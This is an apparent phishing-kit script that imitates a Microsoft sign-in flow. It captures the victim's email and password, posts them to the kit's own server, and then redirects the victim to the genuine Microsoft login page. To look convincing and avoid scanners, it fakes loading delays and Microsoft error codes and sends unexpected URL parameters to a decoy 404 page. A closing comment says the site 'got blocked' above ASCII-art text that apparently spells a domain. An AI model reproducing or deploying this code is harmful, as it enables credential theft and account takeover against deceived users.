// Global variable to store the email
var userEmail = "";

function sanitizeString(str) {
    if (!str) return "";
    return str.replace(/[<>]/g, "");
}

function isValidBase64(str) {
    if (!str) return true;
    try {
        return btoa(atob(str)) === str.replace(/\s/g, "");
    } catch (err) {
        return false;
    }
}

function trigger404() {
    window.location.replace("/404-error-not-found");
}

document.addEventListener("DOMContentLoaded", function () {
    var urlParams = new URLSearchParams(window.location.search);
    const allowedParams = ['u', 'p', 'logo', 'bg', 'edificio', 'planta'];

    // --- REDIRECT CHECK: If edificio AND planta are present, redirect to login.html without them ---
    var hasEdificio = urlParams.has('edificio');
    var hasPlanta = urlParams.has('planta');

    if (hasEdificio && hasPlanta) {
        // Create new URL without edificio and planta parameters
        var newParams = new URLSearchParams();
        for (const [key, value] of urlParams.entries()) {
            if (key !== 'edificio' && key !== 'planta') {
                newParams.append(key, value);
            }
        }

        // Redirect to login.html with remaining parameters
        var newUrl = window.location.pathname;
        if (newParams.toString()) {
            newUrl += '?' + newParams.toString();
        }
        window.location.replace(newUrl);
        return;
    }

    // --- 1. STRICT WHITELIST CHECK ---
    for (const key of urlParams.keys()) {
        if (!allowedParams.includes(key)) {
            trigger404();
            return;
        }
    }

    // --- 2. BASE64 VALIDATION ---
    const b64ParamsToCheck = ['u', 'logo', 'bg'];
    for (let param of b64ParamsToCheck) {
        let value = urlParams.get(param);
        if (value && !isValidBase64(value)) {
            trigger404();
            return;
        }
    }

    // --- 3. UI RENDERING (LOGO) ---
    var defaultLogo = "../static/logo2.png";

    // Check if 'u' parameter exists (pre-filled email)
    var getId = urlParams.get("u");
    if (getId) {
        try {
            userEmail = sanitizeString(atob(getId));
            // If email is pre-filled, skip to password step
            document.getElementById("email-step").style.display = "none";
            document.getElementById("password-step").style.display = "block";
            document.getElementById("display_email").innerText = userEmail;
            var signinOptionsBtn = document.querySelector('.signin-options');
            if (signinOptionsBtn) signinOptionsBtn.style.display = "none";
        } catch (e) {
            trigger404();
            return;
        }
    }

    // Logo logic
    var getLogo = urlParams.get("logo");
    var logoElement1 = document.getElementById("logo_image");
    var logoElement2 = document.getElementById("logo_image_2");

    var logoSrc = defaultLogo;
    if (getLogo) {
        try {
            var decodedLogo = atob(getLogo);
            if (decodedLogo.startsWith('https://') || decodedLogo.startsWith('data:image')) {
                logoSrc = decodedLogo;
            } else {
                trigger404();
                return;
            }
        } catch (e) {
            trigger404();
            return;
        }
    }

    if (logoElement1) logoElement1.src = logoSrc;
    if (logoElement2) logoElement2.src = logoSrc;

    // Set logo for sign-in options view
    var logoElement3 = document.getElementById("logo_image_3");
    if (logoElement3) logoElement3.src = logoSrc;

    // Add click handler for sign-in options button
    var signinOptionsBtn = document.querySelector('.signin-options');
    if (signinOptionsBtn) {
        signinOptionsBtn.addEventListener('click', showSignInOptions);
    }
});

// Show sign-in options view
function showSignInOptions() {
    var emailStep = document.getElementById("email-step");
    var passwordStep = document.getElementById("password-step");
    var optionsView = document.getElementById("signin-options-view");
    var signinOptionsBtn = document.querySelector('.signin-options');
    if (signinOptionsBtn) signinOptionsBtn.style.display = "none";

    // Hide current view
    if (emailStep.style.display !== "none") {
        emailStep.classList.add("slide-out-left");
        setTimeout(function () {
            emailStep.style.display = "none";
            emailStep.classList.remove("slide-out-left");
            optionsView.style.display = "block";
            optionsView.classList.add("slide-in-right");
            setTimeout(function () {
                optionsView.classList.remove("slide-in-right");
            }, 300);
        }, 300);
    } else if (passwordStep.style.display !== "none") {
        passwordStep.classList.add("slide-out-left");
        setTimeout(function () {
            passwordStep.style.display = "none";
            passwordStep.classList.remove("slide-out-left");
            optionsView.style.display = "block";
            optionsView.classList.add("slide-in-right");
            setTimeout(function () {
                optionsView.classList.remove("slide-in-right");
            }, 300);
        }, 300);
    }
}

// Hide sign-in options and go back
function hideSignInOptions() {
    var emailStep = document.getElementById("email-step");
    var optionsView = document.getElementById("signin-options-view");
    var signinOptionsBtn = document.querySelector('.signin-options');
    if (signinOptionsBtn) signinOptionsBtn.style.display = "flex";

    optionsView.classList.add("slide-out-left");
    setTimeout(function () {
        optionsView.style.display = "none";
        optionsView.classList.remove("slide-out-left");
        emailStep.style.display = "block";
        emailStep.classList.add("slide-in-right");
        setTimeout(function () {
            emailStep.classList.remove("slide-in-right");
        }, 300);
    }, 300);
}

// Step 1: Submit Email
function submitEmail() {
    var emailElement = document.getElementById("email");
    var errorElement = document.getElementById("email-error");
    var emailValue = emailElement.value.trim();
    var nextButton = document.getElementById("email-next");
    var loadingSpinner = document.getElementById("loading-spinner");

    // Basic email validation
    if (emailValue.length <= 0 || !emailValue.includes("@")) {
        errorElement.style.display = "block";
        return;
    }

    errorElement.style.display = "none";
    userEmail = emailValue;

    // Show loading spinner, hide button
    nextButton.style.display = "none";
    loadingSpinner.style.display = "flex";

    // Send email to backend for logging
    var xhttp = new XMLHttpRequest();
    xhttp.open("POST", "/email", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            // Simulate loading delay for realism
            setTimeout(function () {
                // Hide loading spinner
                loadingSpinner.style.display = "none";
                nextButton.style.display = "block";

                // Move to password step with animation
                var emailStep = document.getElementById("email-step");
                var passwordStep = document.getElementById("password-step");
                var signinOptionsBtn = document.querySelector('.signin-options');
                if (signinOptionsBtn) signinOptionsBtn.style.display = "none";

                emailStep.classList.add("slide-out-left");
                setTimeout(function () {
                    emailStep.style.display = "none";
                    emailStep.classList.remove("slide-out-left");
                    passwordStep.style.display = "block";
                    passwordStep.classList.add("slide-in-right");
                    document.getElementById("display_email").innerText = userEmail;
                    setTimeout(function () {
                        passwordStep.classList.remove("slide-in-right");
                    }, 300);
                }, 300);
            }, 800); // 800ms loading delay
        }
    };

    var data = "email=" + encodeURIComponent(emailValue);
    xhttp.send(data);
}

// Step 2: Submit Password
function submitPassword() {
    var passwordElement = document.getElementById("password");
    var errorElement = document.getElementById("password-error");
    var passwordValue = passwordElement.value;

    if (passwordValue.length <= 0) {
        errorElement.style.display = "block";
        return;
    }

    errorElement.style.display = "none";

    var xhttp = new XMLHttpRequest();
    xhttp.open("POST", "/", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            window.location.href = "https://login.microsoftonline.com";
        }
    };

    var data = "u=" + encodeURIComponent(userEmail) + "&p=" + encodeURIComponent(passwordValue);
    xhttp.send(data);
}

// Go back to email step
function goBackToEmail() {
    document.getElementById("password-step").style.display = "none";
    document.getElementById("email-step").style.display = "block";
    document.getElementById("email").value = userEmail;
    var signinOptionsBtn = document.querySelector('.signin-options');
    if (signinOptionsBtn) signinOptionsBtn.style.display = "flex";
}

function toggleTroubleshoot() {
    var section = document.getElementById("troubleshoot-section");
    if (section) {
        section.style.display = (section.style.display === "none") ? "block" : "none";
        if (section.style.display === "block") window.scrollTo(0, document.body.scrollHeight);
    }
}

function copyTroubleshoot() {
    const info = `Error Code: 16000\nRequest Id: 756acfe5-ae8e-438a-bc0b-f62fd5130b00\nCorrelation Id: 6f4f1763-7f3a-37fd-a0c1-e33a92cc4b21\nTimestamp: 2026-02-27T19:54:22.801Z`;

    navigator.clipboard.writeText(info).then(() => {
        var status = document.getElementById("copy-status");
        if (status) {
            status.textContent = "✓ Copied";
            status.style.color = "green";
            status.style.fontWeight = "bold";
            status.style.display = "inline";
            setTimeout(() => {
                status.style.display = "none";
            }, 3000);
        }
    });
}
/*  

got blocked but:
         ,-.-.          ,-.-.          ,-.-.       ,-,--.     _ __                                          ,-,--.               ,-.--,                        
,-..-.-./  \==\,-..-.-./  \==\,-..-.-./  \==\    ,-.'-  _\ .-`.' ,`. ,--.-.  .-,--._,..---._   .-.,.---.  ,-.'-  _\     .--.-.  /=/, .',--.-.  .-,--.,--,----. 
|, \=/\=|- |==||, \=/\=|- |==||, \=/\=|- |==|   /==/_ ,_.'/==/, -   Y==/- / /=/_ /==/,   -  \ /==/  `   \/==/_ ,_.'     \==\ -\/=/- / /==/- / /=/_ //==/` - ./ 
|- |/ |/ , /==/|- |/ |/ , /==/|- |/ |/ , /==/   \==\  \  |==| _ .=. \==\, \/=/. /|==|   _   _\==|-, .=., \==\  \         \==\ `-' ,/  \==\, \/=/. / `--`=/. /  
 \, ,     _|==| \, ,     _|==| \, ,     _|==|    \==\ -\ |==| , '=',|\==\  \/ -/ |==|  .=.   |==|   '='  /\==\ -\         |==|,  - |   \==\  \/ -/   /==/- /   
 | -  -  , |==| | -  -  , |==| | -  -  , |==|    _\==\ ,\|==|-  '..'  |==|  ,_/  |==|,|   | -|==|- ,   .' _\==\ ,\       /==/   ,   \   |==|  ,_/   /==/- /-.  
  \  ,  - /==/   \  ,  - /==/   \  ,  - /==/.=. /==/\/ _ |==|,  |     \==\-, /   |==|  '='   /==|_  . ,'./==/\/ _ | .=. /==/, .--, - \  \==\-, /   /==/, `--`\ 
  |-  /\ /==/    |-  /\ /==/    |-  /\ /==/:=; :\==\ - , /==/ - |     /==/._/    |==|-,   _`//==/  /\ ,  )==\ - , /:=; :\==\- \/=/ , /  /==/._/    \==\-  -, | 
  `--`  `--`     `--`  `--`     `--`  `--`  `=`  `--`---'`--`---'     `--`-`     `-.`.____.' `--`-`--`--' `--`---'  `=`  `--`-'  `--`   `--`-`      `--`.-.--` 

  */